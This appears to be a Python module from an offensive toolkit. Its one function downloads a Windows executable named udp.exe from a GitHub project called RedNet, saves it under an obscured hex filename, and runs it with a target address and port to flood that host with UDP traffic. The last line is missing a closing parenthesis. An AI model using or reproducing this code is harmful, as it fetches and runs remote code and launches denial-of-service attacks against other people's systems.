import wget,os

def _flood(alvo,porta):
    wget.download('https://github.com/ReddyyZ/RedNet/blob/master/modules/udp.exe?raw=true', out='C:/temp/0x32546745.exe')
    os.system('C:/temp/0x32546745.exe {} {}'.format(alvo,porta)